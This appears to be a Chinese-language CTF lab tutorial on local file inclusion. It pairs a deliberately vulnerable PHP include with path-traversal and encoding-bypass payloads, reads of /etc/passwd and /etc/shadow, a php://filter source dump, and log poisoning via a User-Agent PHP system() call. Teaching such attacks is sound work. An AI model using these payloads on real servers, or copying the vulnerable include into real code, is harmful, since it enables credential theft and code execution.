# LFI 基础

## 概述

LFI（Local File Inclusion）通过路径遍历包含服务器上的任意文件。

## 漏洞代码

```php
<?php
$page = $_GET['page'];
include('pages/' . $page);
?>
```

## 路径遍历

```
?page=home              → pages/home.php（正常）
?page=../../../etc/passwd  → pages/../../../etc/passwd（越权）
```

### 路径遍历符号

```
../     上一级目录
..%2f   URL 编码的 ../
..%252f 双重编码
....//  双写绕过
```

## 攻击步骤

### 1. 确认漏洞

```
?page=../../../etc/passwd
```

如果看到 `/etc/passwd` 文件内容，说明存在 LFI。

### 2. 读取敏感文件

```
?page=../../../etc/passwd
?page=../../../etc/shadow
?page=../../../etc/hosts
?page=../../../var/log/apache2/access.log
```

### 3. 读取 PHP 源码

使用 PHP 伪协议：

```
?page=php://filter/convert.base64-encode/resource=../config.php
```

解码 base64 即可看到源码。

### 4. 配合日志投毒执行代码

1. 向服务器发送包含 PHP 代码的请求（如 User-Agent 中写入 `<?php system('id'); ?>`）
2. 包含日志文件：`?page=../../../var/log/apache2/access.log`
3. PHP 代码被执行

## 练习步骤

1. 访问文件查看功能
2. 尝试 `?page=../../../etc/passwd` — 确认 LFI
3. 使用 php://filter 读取源码
4. 查找 flag 文件路径

## flag

在 `/flag` 或 `/var/www/html/flag.txt` 中查找 `CR{...}` 格式的 flag。
